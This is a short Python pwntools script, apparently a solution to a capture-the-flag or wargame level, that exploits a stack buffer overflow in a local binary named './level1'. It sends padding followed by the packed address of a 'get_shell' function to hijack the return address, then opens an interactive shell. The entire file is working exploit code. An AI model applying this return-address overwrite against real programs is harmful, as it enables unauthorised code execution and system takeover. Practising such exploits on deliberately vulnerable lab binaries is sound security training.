#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
r = process("./level1")

w = r.recvline()
print w

get_shell = 0x80484cb

payload = 'a'*9  + 'a'*4 +  p32(get_shell)

print r.pid
pause()
r.sendline(payload)

r.interactive()

